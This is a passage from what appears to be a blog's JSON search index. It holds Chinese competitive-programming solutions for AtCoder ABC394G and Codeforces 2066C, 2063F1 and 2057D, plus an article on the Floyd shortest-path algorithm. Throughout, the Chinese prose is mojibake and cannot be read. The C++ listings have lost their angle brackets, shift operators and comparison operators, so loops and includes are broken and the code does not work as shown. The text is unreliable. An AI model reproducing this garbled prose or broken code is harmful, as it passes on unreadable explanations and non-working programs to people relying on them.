tot; else int mid = (l + r) 1; solve (res,cur 1,l,mid,tot);solve (res,cur 1 | 1,mid + 1,r,tot); while (top la) sz[st[top].second] -= sz[st[top].first]; fa[st[top].first] = st[top].first; --top;","categories":["Solution"]},{"title":"é¢˜è§£ï¼š[ABC394G] Dense Buildings","path":"/2025/02/23/ABD394G/","content":"é€šè¿‡è§‚å¯Ÿï¼Œé¦–å…ˆå¯ä»¥å¾—å‡ºå‡ ä¸ªå°ç»“è®ºï¼š $(a_i,b_i,y_i) \\to (c_i,d_i,z_i)$ çš„å…¶ä¸­ä¸€æ¡æœ€ä¼˜è·¯å¾„ä¸€å®šæ˜¯ $(a_i,b_i,y_i) \\to (a_i,b_i,w) \\to (c_i,d_i,w) \\to (c_i,d_i,z_i)$ã€‚ $w$ è¶Šå°ï¼Œè¶Šæœ‰å¯èƒ½åˆæ³•ï¼Œæ»¡è¶³å•è°ƒæ€§ï¼Œå› æ­¤å¯ä»¥äºŒåˆ†ç­”æ¡ˆï¼Œæœ€åå•ç»„è¯¢é—®çš„ç­”æ¡ˆå³ä¸º $y_i + z_i - 2 \\times w$ã€‚ å¯¹äºå•ç»„è¯¢é—®ï¼Œå¯ä»¥ä»é«˜åˆ°ä½è¿›è¡Œç›¸é‚»å—åˆå¹¶ï¼Œå› æ­¤æœ€åçš„ç­”æ¡ˆæ£€æµ‹å¯ä»¥è½¬æ¢ä¸ºå¹¶æŸ¥é›†æ£€éªŒä¸¤ç‚¹çš„è¿é€šæ€§ã€‚æ€»å…±çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(QV \\alpha(HW) \\log (V))$ï¼ˆå…¶ä¸­ $V$ ä¾¿æ˜¯é«˜åº¦çš„å€¼åŸŸï¼‰ã€‚ è€ƒè™‘ä¼˜åŒ–ï¼Œä¸éš¾å‘ç°å„ç»„è¯¢é—®ç›´æ¥ç›¸äº’ç‹¬ç«‹ï¼Œä¸”å¯ä»¥ç¦»çº¿æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•´ä½“äºŒåˆ†ã€‚é¦–å…ˆå°†æ¯ç»„ç­”æ¡ˆçš„ $l_i = 1,r_i = \\min (y_i,z_i)$ï¼Œå¯¹äºä¸€æ¬¡äºŒåˆ†æ“ä½œï¼Œè‹¥æ­¤æ—¶ $l_i \\le r_i$ ä»ç„¶æˆç«‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•å°† $\\frac{l_i + r_i}{2}$ ä½œä¸ºè¯¥ç»„è¯¢é—®çš„ç­”æ¡ˆã€‚æ£€éªŒçš„è¿‡ç¨‹å’Œå•ç»„è¯¢é—®å¤§è‡´ç›¸åŒï¼Œå¯ä»¥ä»é«˜åˆ°ä½è¿›è¡Œç›¸é‚»å—åˆå¹¶åæ£€éªŒè¿é€šæ€§å³å¯ã€‚æ—¶é—´å¤æ‚åº¦å°±é™åˆ°äº† $O(Q\\alpha(HW) \\log (V))$ï¼Œä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long longusing namespace std;const int M = 1e6;const int MAXN = 505;const int MAXQ = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,q,fl;int fa[M + 5],sx[MAXQ],sy[MAXQ],sh[MAXQ],fx[MAXQ],fy[MAXQ],fh[MAXQ],l[MAXQ],r[MAXQ],ans[MAXQ],a[MAXN][MAXN];vector pair int,int f[M + 5];vector int res[M + 5];int getfa (int u) return fa[u] == u ? u : fa[u] = getfa (fa[u]); void merge (int u,int v) u = getfa (u),v = getfa (v); if (u != v) fa[u] = v;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) a[i][j] = read (); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i != n) f[min (a[i][j],a[i + 1][j])].push_back ((i - 1) * m + j,i * m + j); if (j != m) f[min (a[i][j],a[i][j + 1])].push_back ((i - 1) * m + j,(i - 1) * m + j + 1);//ç›¸é‚»å—çš„é¢„å¤„ç† q = read (); for (int i = 1;i = q;++i) sx[i] = read (),sy[i] = read (),sh[i] = read (); fx[i] = read (),fy[i] = read (),fh[i] = read (); l[i] = 1,r[i] = min (sh[i],fh[i]);//è¾¹ç•Œ while (!fl) //ä»ç„¶æœ‰è¯¢é—®éœ€è¦äºŒåˆ† fl = 1; for (int i = 1;i = q;++i) if (l[i] r[i]) continue; int mid = (l[i] + r[i]) 1; res[mid].push_back (i); fl = 0; for (int i = 1;i = M;++i) fa[i] = i; for (int i = M;i = 1;--i) for (auto item : f[i]) merge (item.first,item.second); for (auto p : res[i]) // ç¬¬ p ä¸ªè¯¢é—®ç­”æ¡ˆä¸º i æ˜¯å¦æˆç«‹ int u = (sx[p] - 1) * m + sy[p],v = (fx[p] - 1) * m + fy[p]; u = getfa (u),v = getfa (v); if (u == v) ans[p] = i,l[p] = i + 1; else r[p] = i - 1; for (int i = 1;i = M;++i) res[i].clear (); for (int i = 1;i = q;++i) printf (%d ,sh[i] + fh[i] - 2 * ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2066C Bitwise Slides","path":"/2025/02/14/CF2066C/","content":"é¦–å…ˆè€ƒè™‘æš´åŠ›çš„è½¬ç§»ï¼Œå½“æšä¸¾åˆ°ç¬¬ $i$ ä¸ªæ•°æ—¶ï¼Œæˆ‘ä»¬å°è¯•å°†ä¹‹å‰æ‰€æœ‰çš„æœ‰æ•ˆçŠ¶æ€çš„ $P,Q,R$ å‡ä¸ $a_i$ å°è¯•å»å¼‚æˆ–ï¼Œç„¶åæ£€æµ‹åˆæ³•æ€§ã€‚äºæ˜¯å°±æœ‰ï¼š la[0,0,0] = 1;for (int i = 1;i = n;++i) for (auto item : la) node v = item.first; int x = v.p,y = v.q,z = v.r; if (y == z || (x ^ a[i]) == y || (x ^ a[i]) == z) dp[x ^ a[i],y,z] += la[v]; if (x == z || (y ^ a[i]) == x || (y ^ a[i]) == z) dp[x,y ^ a[i],z] += la[v]; if (x == y || (z ^ a[i]) == x || (z ^ a[i]) == y) dp[x,y,z ^ a[i]] += la[v]; for (auto item : dp) dp[item.first] %= MOD; la.clear ();la = dp;dp.clear (); ä½†è¿™æ ·æ˜¾ç„¶ä¼šæœ‰å¾ˆå¤šå†—ä½™çš„è½¬ç§»ä»¥åŠåˆ¤æ–­ï¼Œè€ƒè™‘å¼‚æˆ–çš„æ€§è´¨å»ä¼˜åŒ–ã€‚ å›é¡¾ä¸€ä¸‹é¢˜é¢ï¼Œå¯¹äºä¸€ä¸ªæ•°å­—åªèƒ½é€‰æ‹© $P,Q,R$ ä¸­çš„ä¸€ä¸ªå»å¼‚æˆ–ï¼Œé‚£ä¹ˆå¤„ç†å®Œ $a_i$ åï¼Œ$P \\oplus Q \\oplus R = \\oplus _{j = 1}^i a_j = p_i$ã€‚ç”±äº $P,Q,R$ ä¸èƒ½ä¸¤ä¸¤äº’å¼‚ï¼Œæ­¤æ—¶è®¾ $(P,Q,R)$ ä¸­ç›¸åŒçš„æ•°ä¸º $x$ï¼Œç”±äº $x \\oplus y \\oplus y = x$ï¼Œæ•…å¯èƒ½çš„æœ‰æ•ˆçŠ¶æ€ä¸º $(x,x,p_i),(x,p_i,x),(p_i,x,x)$ ä¸­çš„ä¸€ä¸ªã€‚ è®¾ $dp_{i,x}$ è¡¨ç¤ºåœ¨å¤„ç†ç¬¬ $i$ ä¸ªæ•°åç›¸åŒçš„æ•°ä¸º $x$ çš„æ–¹æ¡ˆæ•°ã€‚åˆ™ $(x,x,p_i)$ çš„ä¸Šä¸€ä¸ªçŠ¶æ€å¯èƒ½ä¸º $(x \\oplus a_i,x,p_i)$ æˆ– $(x,x,p_i \\oplus a_i)$ã€‚ ä¸Šä¸€ä¸ªçŠ¶æ€ä¸º $(x \\oplus a_i,x,p_i)$ ç”±äºè¦ä¿è¯çŠ¶æ€çš„åˆæ³•æ€§ï¼Œéœ€è¦åˆ†ç±»è®¨è®ºå…·ä½“æ˜¯å“ªä¸¤ä¸ªæ•°ç›¸åŒï¼š $x \\oplus a_i = x \\Rightarrow a_i = 0$ï¼Œä¸é¢˜å¹²çŸ›ç›¾ï¼Œæ•…ä¸å¯èƒ½æˆç«‹ã€‚ $x \\oplus a_i = p_i \\Rightarrow x = p_{i - 1}$ï¼Œæ­¤æ—¶è½¬ç§»æ–¹ç¨‹ä¸º $dp_{i,x} = dp_{i,p_{i - 1}} = dp_{i-1,p_i}$ã€‚ $x = p_i$ï¼Œæ­¤æ—¶è½¬ç§»æ–¹ç¨‹ä¸º $dp_{i,x} = dp_{i,p_i} = dp_{i - 1,p_i}$ ä¸Šä¸€ä¸ªçŠ¶æ€ä¸º $(x,x,p_i \\oplus a_i)$ æ˜¾ç„¶ï¼Œè½¬ç§»æ–¹ç¨‹ä¸º $dp_{i,x} = dp_{i - 1,x}$ã€‚ é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œ$dp_{i,x} \\leftarrow dp_{i - 1,x}$ ä¸æˆç«‹å½“ä¸”ä»…å½“ $x = p_{i - 1}$ çš„æƒ…å†µï¼Œå…¶ä½™ç›´æ¥ç»§æ‰¿ã€‚æœ€ç»ˆçŠ¶æ€ä¸º $(x,x,p_i)$ï¼Œä»£å…¥ $x$ åæ˜¯ $(p_{i - 1},p_{i - 1},p_i)$ã€‚ç”± $(p_{i - 1},p_{i - 1},p_{i - 1})$ è½¬ç§»å…±æœ‰ä¸‰ç§æ–¹å¼ï¼Œè€Œç”± $(p_{i - 1},p_i,p_i)$ è½¬ç§»å…±æœ‰ä¸¤ç§æ–¹å¼ã€‚åŒæ—¶ï¼Œå¯ä»¥å‘ç°å¯ä»¥åˆ©ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ï¼Œå› æ­¤å¯ä»¥æœ‰ï¼š dp_{p_{i - 1}} = 2 \\times dp_{p_i} + 3 \\times dp_{p_{i - 1}}å½“ç„¶ï¼Œåˆå§‹æ¡ä»¶ä¸º $dp_{0} = 1$ã€‚æ•°å­—è¿‡å¤§ï¼Œç¦»æ•£åŒ–æˆ–è€…ç›´æ¥ç”¨ map å³å¯ã€‚ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,a[MAX],p[MAX];ll ans;map int,ll dp;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();ans = 0;dp.clear (); for (int i = 1;i = n;++i) a[i] = read (),p[i] = p[i - 1] ^ a[i]; dp[0] = 1; for (int i = 1;i = n;++i) dp[p[i - 1]] = (dp[p[i]] * 2 + dp[p[i - 1]] * 3) % MOD; for (auto item : dp) ans = (ans + item.second) % MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2063F1 Counting Is Not Fun (Easy Version)","path":"/2025/02/03/CF2063F1/","content":"æ‰€æœ‰æ–¹æ¡ˆæ•°å‡åŸºäºå¡ç‰¹å…°æ•°ï¼Œä¸å¦¨è®¾ $F(x) = \\dfrac{\\tbinom{2x}{x}}{x + 1}$ æ¥è¡¨ç¤ºå¡ç‰¹å…°æ•°ã€‚ åˆå§‹æ—¶æ˜¾ç„¶ç­”æ¡ˆä¸º $F(n)$ã€‚å½“æœ‰æ‹¬å·åŠ å…¥æ—¶ï¼Œæœªè¢«æ·»åŠ æ‹¬å·çš„ä½ç½®çš„è´¡çŒ®ä¸ä¼šè¶…è¿‡æœ€å¤–å±‚å·²åŒ¹é…çš„æ‹¬å·ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå½“ $?????? \\to \\color{red}{(}??\\color{red}??$ æ—¶ï¼Œç­”æ¡ˆå°±å˜åŒ–ä¸º $F(3) \\to F(1) \\times F (1)$ã€‚ å› æ­¤å¯ä»¥å…ˆå°†è¿™ $n$ å¯¹æ‹¬å·è¿›è¡Œç¼–å·ï¼Œç„¶åå€ŸåŠ©æ ˆï¼Œå½“é‡åˆ°æœªè¢«æ·»åŠ æ‹¬å·çš„ä½ç½®æ—¶ï¼Œå°†è´¡çŒ®åŠ åœ¨æ ˆé¡¶çš„æ‹¬å·å¯¹åº”çš„ç¼–å·ä¸Šï¼Œæœ€åæ ¹æ®ä¹˜æ³•åŸç†æ±‚è§£å³å¯ã€‚ æ—¶é—´å¤æ‚åº¦ $O(n^2)$ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include stack#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5005;const int MOD = 998244353;inline int read ();int t,n,p[MAX 1],l[MAX],r[MAX],cnt[MAX];ll ans,f[MAX 1],inv[MAX 1],inv2[MAX 1]; stack int s;ll qpow (ll x,ll y) ll res = 1; while (y) if (y 1) res = res * x % MOD; x = x * x % MOD; y = 1; return res;ll catalan (int x) return f[2 * x] * inv[x] % MOD * inv[x] % MOD * inv2[x + 1] % MOD; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); f[0] = inv[0] = 1; for (int i = 1;i = 10000;++i) f[i] = f[i - 1] * i % MOD,inv2[i] = qpow (i,MOD - 2); inv[10000] = qpow (f[10000],MOD - 2); for (int i = 9999;i;--i) inv[i] = inv[i + 1] * (i + 1) % MOD; s.push (0);//æœ€å¤–å±‚çš„è´¡çŒ® t = read (); while (t--) n = read (); for (int i = 1;i = n;++i) l[i] = read (),r[i] = read (); for (int i = 1;i = 2 * n;++i) p[i] = 0; for (int o = 0;o = n;++o) for (int i = 0;i = n;++i) cnt[i] = 0; p[l[o]] = o;p[r[o]] = -o;ans = 1;//æ–°æ·»åŠ çš„æ‹¬å·è¿›è¡Œæ ‡è®° for (int i = 1;i = 2 * n;++i) if (!p[i]) ++cnt[s.top ()];//æœªè¢«æ·»åŠ çš„ä½ç½® else if (p[i] 0) s.pop ();//å·²ç»åŒ¹é…ï¼Œå¼¹å‡ºå³å¯ else s.push (p[i]); for (int i = 0;i = n;++i) ans = ans * catalan (cnt[i] / 2) % MOD;//æ³¨æ„å·¦å³æ‹¬å·å„è´¡çŒ®ä¸€æ¬¡ï¼Œå› æ­¤éœ€è¦é™¤ä»¥ 2 printf (%lld ,ans); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2057D Gifts Order","path":"/2025/01/07/CF2057D/","content":"è¿™æ˜¯ä¸€ç¯‡ DDP åšæ³•çš„é¢˜è§£ã€‚ é¦–å…ˆéœ€è¦æƒ³é€šçš„ä¸€ä¸ªç‚¹å°±æ˜¯æœ€å€¼ä¸€å®šå‡ºç°åœ¨ç«¯ç‚¹å¤„ï¼Œå¦åˆ™åŒºé—´é•¿åº¦å˜åŒ–è€Œæå·®ä¸å˜ï¼Œä¼šå¯¼è‡´ç­”æ¡ˆæ›´åŠ£ã€‚ è®¾æœ€å€¼æ‰€åœ¨çš„ä½ç½®ä¸º $l,r$ï¼Œåˆ™ä¼šæœ‰ä¸¤ç§æƒ…å†µï¼š è‹¥æœ€å¤§å€¼åœ¨æœ€å°å€¼å·¦ä¾§ï¼Œåˆ™ç­”æ¡ˆä¸º $a_l - a_r - (r - l) = (a_l + l) - (a_r + r)$ã€‚ è‹¥æœ€å¤§å€¼åœ¨æœ€å°å€¼å³ä¾§ï¼Œåˆ™ç­”æ¡ˆä¸º $a_r - a_l - (r - l) = (a_r - r) - (a_l - l)$ã€‚ ä¸éš¾å‘ç°æˆ‘ä»¬åªéœ€è¦ç»´æŠ¤ $a_i + i$ å’Œ $a_i - i$ å³å¯ã€‚ å½“æœ¬é¢˜ä¸å­˜åœ¨ä¿®æ”¹æ“ä½œæ—¶ï¼Œå°±æ˜¯ è™¹è‰²çš„åŒ—æ–—ä¸ƒæ˜Ÿã€‚è®¾ $f_{i,0}$ è¡¨ç¤º $[1,i]$ ä¸­ $a_i + i$ çš„æœ€å¤§å€¼ï¼Œ$f_{i,1}$ è¡¨ç¤º $[1,i]$ ä¸­ $a_i - i$ çš„æœ€å°å€¼ï¼Œ$f_{i,2}$ è¡¨ç¤º $[1,i]$ ä¸­ç­”æ¡ˆçš„æœ€å¤§å€¼ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥å¾—åˆ°è½¬ç§»æ–¹ç¨‹ï¼š \\begin{cases} f_{i,0} = \\max \\ \\{\\ f_{i - 1,0},a_i + i\\ \\}\\\\ f_{i,1} = \\min \\ \\{\\ f_{i - 1,1},a_i - i\\ \\}\\\\ f_{i,2} = \\max \\ \\{\\ f_{i - 1,2},f_{i - 1,0} - (a_i + i),(a_i - i) - f_{i - 1,1}\\ \\} \\end{cases}æœ€åçš„ç­”æ¡ˆä¾¿æ˜¯ $f_{n,2}$ã€‚è¿›ä¸€æ­¥å¯ä»¥å‘ç° $f_{i,0/1/2}$ çš„å€¼åªä¾èµ–äºå‰ä¸€é¡¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ç©ºé—´ï¼Œæœ€åæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ï¼Œç©ºé—´å¤æ‚åº¦ä¸º $O(1)$ã€‚ä¸ºäº†æ›´å¥½çš„ä¸º DDP åšå‡†å¤‡ï¼Œå¯ä»¥é€šè¿‡å¢åŠ è´Ÿå·çš„æ–¹å¼æ”¹å†™è½¬ç§»æ–¹ç¨‹ï¼Œä½¿å¾—å‡å˜ä¸ºå– $\\max$ çš„å½¢å¼ï¼š \\begin{cases} f_{i,0} = \\max \\ \\{\\ f_{i - 1,0},a_i + i\\ \\}\\\\ f_{i,1} = \\color{red}\\max\\color{black} \\ \\{\\ f_{i - 1,1},\\color{red}-\\color{black}(a_i - i)\\ \\}\\\\ f_{i,2} = \\max \\ \\{\\ f_{i - 1,2},f_{i - 1,0} - (a_i + i), (a_i - i)\\color{red}{+}\\color{black}f_{i - 1,1}\\ \\} \\end{cases}äºæ˜¯å¯ä»¥å¾—åˆ° è™¹è‰²çš„åŒ—æ–—ä¸ƒæ˜Ÿ çš„æ ¸å¿ƒä»£ç ã€æ³¨æ„åˆå§‹åŒ–ã€‘ï¼š f[0][1] = -INF;for (int i = 1;i = n;++i) int x = read (); f[i 1][0] = max (f[(i + 1) 1][0],x + i); f[i 1][1] = max (f[(i + 1) 1][1],-(x - i)); f[i 1][2] = max (f[(i + 1) 1][2],max (f[(i + 1) 1][0] - (x + i),(x - i) + f[(i + 1) 1][1]));printf (%d ,f[n 1][2] - 1); æ—¢ç„¶å·²ç»å†™æˆäº†å¯ä»¥è¿­ä»£çš„å½¢å¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ”¹å†™æˆçŸ©é˜µå»ç»´æŠ¤ã€‚å½“ç„¶ï¼Œè¿™é‡Œçš„çŸ©é˜µä¹˜æ³•éœ€è¦è¢«é‡è½½ä¸ºç›¸åŠ å–æœ€å¤§å€¼çš„å½¢å¼ã€‚å¦‚ä¸‹ï¼š \\begin{bmatrix} 0 & -\\infty & -\\infty & a_i + i\\\\ -\\infty & 0 & -\\infty & -(a_i - i)\\\\ -(a_i + i) & a_i - i & 0 & -\\infty\\\\ -\\infty & -\\infty & -\\infty & 0 \\end{bmatrix} \\begin{bmatrix} f_{i - 1,0}\\\\ f_{i - 1,1}\\\\ f_{i - 1,2}\\\\ 0 \\end{bmatrix} = \\begin{bmatrix} f_{i,0}\\\\ f_{i,1}\\\\ f_{i,2}\\\\ 0 \\end{bmatrix}ç”±äºè½¬ç§»çš„æ–¹ç¨‹å¼ä»ç„¶æ»¡è¶³çŸ©é˜µçš„ç»“åˆå¾‹ï¼Œå› æ­¤ç”¨çº¿æ®µæ ‘å•ç‚¹ä¿®æ”¹å°±å¯ä»¥ç»´æŠ¤çŸ©é˜µã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒçŸ©é˜µä¸æ»¡è¶³äº¤æ¢å¾‹ï¼Œå› æ­¤éœ€è¦æ³¨æ„çº¿æ®µæ ‘æ›´æ–°æ—¶çš„é¡ºåºï¼ä»¤ $m = 4$ï¼Œåˆ™å•ç»„æ•°æ®çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(m^3 q \\log n)$ã€‚ æœ€åæ”¾ä¸ªä»£ç å§ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct Mat int a[4][4]; Mat () init (a); void clear () init (a); tree[MAX 2],I,A;int t,n,q,a[MAX]; Mat operator * (Mat A,Mat B);void build (int cur,int l,int r);void modify (int cur,int l,int r,int x,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); I.a[0][1] = I.a[0][2] = I.a[1][0] = I.a[1][2] = I.a[2][3] = I.a[3][0] = I.a[3][1] = I.a[3][2] = -INF; t = read (); while (t--) n = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (); build (1,1,n); Mat ans;ans.a[1][0] = -INF; ans = tree[1] * ans; printf (%d ,ans.a[2][0]); while (q--) int x = read (),v = read (); modify (1,1,n,x,v); Mat ans;ans.a[1][0] = -INF;//æ³¨æ„åˆå§‹åŒ– ans = tree[1] * ans; printf (%d ,ans.a[2][0]); for (int i = 1;i = 4 * n;++i) tree[i].clear (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;Mat operator * (Mat A,Mat B) Mat C; for (int i = 0;i 4;++i) for (int j = 0;j 4;++j) C.a[i][j] = -INF; for (int i = 0;i 4;++i) for (int j = 0;j 4;++j) for (int k = 0;k 4;++k) C.a[i][j] = max (C.a[i][j],A.a[i][k] + B.a[k][j]);//é‡è½½ä¸ºç›¸åŠ åå–æœ€å¤§å€¼ return C;void build (int cur,int l,int r) if (l == r) tree[cur] = I; tree[cur].a[0][3] = a[l] + l;tree[cur].a[1][3] = -(a[l] - l); tree[cur].a[2][0] = - (a[l] + l);tree[cur].a[2][1] = a[l] - l; return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r); tree[cur] = tree[cur 1 | 1] * tree[cur 1];//æ³¨æ„é¡ºåºï¼ï¼ï¼ void modify (int cur,int l,int r,int x,int v) if (l == r) a[l] = v;tree[cur] = I;//ä¸€äº›è´Ÿæ— ç©·çš„å¤„ç†æ”¾åœ¨ I ä¸­ tree[cur].a[0][3] = a[l] + l;tree[cur].a[1][3] = -(a[l] - l); tree[cur].a[2][0] = - (a[l] + l);tree[cur].a[2][1] = a[l] - l; return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v); else modify (cur 1 | 1,mid + 1,r,x,v); tree[cur] = tree[cur 1 | 1] * tree[cur 1];//æ³¨æ„é¡ºåºï¼ï¼ï¼","categories":["Solution"]},{"title":"ä½ çœŸçš„æ‡‚ Floyd å—","path":"/2025/01/06/Floyd/","content":"Floyd æ±‚æœ€çŸ­è·¯ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n^3)$ï¼Œç©ºé—´å¤æ‚åº¦ $O(n^2)$ã€‚ for (int k = 1;k = n;++k) for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) dis[i][j] = min (dis[i][j],dis[i][k] + dis[k][j]); ã€Q1ã€‘è¯¥ç®—æ³•çš„æ­£ç¡®æ€§ï¼Ÿ ç®—æ³•åŸºäºåŠ¨æ€è§„åˆ’ã€‚è®¾ $f_{k,i,j}$ è¡¨ç¤ºåªèƒ½å€ŸåŠ©äº $1,2,\\cdots,k$ ç‚¹æ—¶ï¼Œ$i \\to j$ çš„æœ€çŸ­è·¯å¾„ã€‚é‚£ä¹ˆæ ¹æ®æ˜¯å¦ç»è¿‡ $k$ ç‚¹ï¼Œå¯ä»¥åˆ—å‡ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š f_{k,i,j} = \\min (f_{k - 1,i,j},f_{k - 1,i,k} + f_{k - 1,k,j})å¾ˆå¥½ç†è§£ï¼Œåè€…ç›¸å½“äºä»¥ $k$ ä½œä¸ºä¸­è½¬ç«™ï¼Œå³ $i \\to k \\to j$ çš„è½¬ç§»ã€‚é‚£ä¹ˆå½“å¤„ç†è¯¢é—® $u,v$ æ—¶ï¼Œ$f_{n,u,v}$ å³ä¸ºæ‰€æ±‚ã€‚ å¯ä»¥å‘ç° $f_{k,i,j}$ åªå¯¹ $f_{k - 1,iâ€™,jâ€™}$ äº§ç”Ÿä¾èµ–ï¼Œä¸éš¾æƒ³åˆ°å¯ä»¥æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ã€‚é‚£ä¹ˆï¼ŒFloyd æœ€ç»ˆç›´æ¥åˆ å»é‚£ä¸€ç»´ï¼Œè¿™æ ·åšä¸ä¼šå‡ºé”™å—ï¼Ÿ ç°åœ¨æˆ‘ä»¬å»æ‰ç¬¬ä¸€ç»´ï¼Œåªè¦ä¿è¯åœ¨è½¬ç§»æ—¶æ–¹ç¨‹å³ä¾§çš„ $f_{i,j},f_{i,k},f_{k,j}$ éƒ½æ˜¯æœªè¢«è¦†ç›–è¿‡çš„å³å¯ã€‚å½“æœ€å¤–å±‚ä¸ºç¬¬ $k$ æ¬¡å¾ªç¯æ—¶ï¼Œæ˜¾ç„¶ $f_{i,j}$ è¿˜æœªè¢«è¦†ç›–ã€‚å¯¹äº $f_{i,k},f_{k,j}$ï¼ŒæŒ‰ç…§ä¹‹å‰çš„ä¸‰ç»´è½¬ç§»æ–¹ç¨‹ï¼Œå¯ä»¥å¾—åˆ° $f_{k,i,k} = \\min (f_{k - 1,i,k},f_{k - 1,i,k} + f_{k - 1,k,k}) = f_{k - 1,i,k}$ï¼Œ$f_{k,j}$ åŒç†ã€‚å› æ­¤æˆ‘ä»¬è¯æ˜äº†ç©ºé—´ä¼˜åŒ–çš„è¯¥ç®—æ³•çš„æ­£ç¡®æ€§ã€‚ ä¸æ­¤åŒæ—¶ï¼Œä»åŠ¨æ€è§„åˆ’çš„è§’åº¦å‡ºå‘ï¼Œâ€œä¸ºä»€ä¹ˆ $k$ å¾ªç¯éœ€è¦æ”¾åœ¨æœ€å¤–å±‚ï¼Ÿâ€ä¹Ÿå°±å¾ˆå¥½ç†è§£äº†ã€‚ ã€Q2ã€‘è‹¥æ¯æ¬¡ä¿®æ”¹ä¸€æ¡è¾¹çš„æƒå€¼ï¼Œæœ‰å¿…è¦é‡æ–°å®Œæ•´çš„å»åšä¸€é Floyd ç®—æ³•å—ï¼Ÿ ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œåªéœ€è¦ $O(n^2)$ å³å¯å®ç°å±€éƒ¨æ›´æ–°ã€‚è®¾ $(u,v)$ çš„æƒå€¼æ›´æ–°ä¸º $w(u,v)$ï¼ˆæ— å‘å›¾ï¼‰ï¼Œåˆ™å¯å¾—åˆ°è½¬ç§»æ–¹ç¨‹ï¼š f_{i,j} = \\min (f_{i,j},\\min (f_{i,u} + w(u,v) + f_{v,j},f_{i,v} + w(v,u) + f_{u,j}))ä¾‹é¢˜ï¼š Another Exercise on Graphs (easy version)Another Exercise on Graphs (hard version) è§£æï¼š æ ¹æ®è¾¹æƒæ’åºï¼Œç„¶åç­”æ¡ˆæ˜¾ç„¶å°±æ˜¯æŸä¸€æ¡è¾¹çš„å€¼ã€‚å½“æšä¸¾åˆ°ç¬¬ $i$ æ¡è¾¹çš„æ—¶å€™ï¼Œæ¯”å…¶å°çš„è¾¹å‡ç½®ä¸º $0$ï¼Œå¦åˆ™ä¸º $1$ã€‚è‹¥ $i \\to j$ çš„æœ€çŸ­è·¯æ˜¯ $w_i$ï¼Œé‚£ä¹ˆç¬¬ $i + 1$ å¤§çš„ä¾¿æ˜¯è¿™æ¡è¾¹ã€‚ è¿›ä¸€æ­¥çš„ï¼Œ$\\texttt{E2}$ çš„ $m$ å¾ˆå¤§ï¼Œå¯æ˜¯æˆ‘ä»¬ä¼šå‘ç°æœ‰æ•ˆçš„æ›´æ–°åªæœ‰ $n - 1$ æ¬¡ï¼Œå› ä¸ºä¹‹å $(i,j)$ çš„æœ€çŸ­è·¯å·²ç»ä¸º $0$ï¼Œä¸ä¼šå†å‘ç”Ÿå˜åŒ–ï¼Œå¹¶æŸ¥é›†ç»´æŠ¤å³å¯ã€‚ ã€Q3ã€‘å˜å¼ $1$ ã€æ¨¡æ¿ã€‘ä¼ é€’é—­åŒ… ç®€å•æ¥è¯´ï¼Œå¦‚æœåŸå…³ç³»å›¾ä¸Šæœ‰ $i$ åˆ° $j$ çš„è·¯å¾„ï¼Œåˆ™å…¶ä¼ 